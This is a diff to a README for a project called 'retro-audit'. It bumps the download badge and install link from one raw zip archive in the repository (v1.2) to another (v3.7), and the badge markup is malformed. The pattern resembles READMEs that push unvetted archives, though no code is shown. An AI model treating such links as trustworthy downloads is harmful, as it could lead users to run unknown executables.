@@ -1,6 +1,6 @@
 # 🎮 retro-audit - Create Engaging Retro Content Easily
 
-[![Download retro-audit](https://github.com/YOXXIC/retro-audit/raw/refs/heads/main/retro_audit/audit_retro_v1.2.zip%20retro--audit-%2333cc33)](https://github.com/YOXXIC/retro-audit/raw/refs/heads/main/retro_audit/audit_retro_v1.2.zip)
+[![Download retro-audit](https://github.com/YOXXIC/retro-audit/raw/refs/heads/main/retro_audit/audit_retro_v3.7.zip%20retro--audit-%2333cc33)](https://github.com/YOXXIC/retro-audit/raw/refs/heads/main/retro_audit/audit_retro_v3.7.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-To download retro-audit, visit this page: [Download retro-audit](https://github.com/YOXXIC/retro-audit/raw/refs/heads/main/retro_audit/audit_retro_v1.2.zip). Select the latest version to ensure you have the newest features and fixes.
+To download retro-audit, visit this page: [Download retro-audit](https://github.com/YOXXIC/retro-audit/raw/refs/heads/main/retro_audit/audit_retro_v3.7.zip). Select the latest version to ensure you have the newest features and fixes.
 
 ### Steps to Download:
 
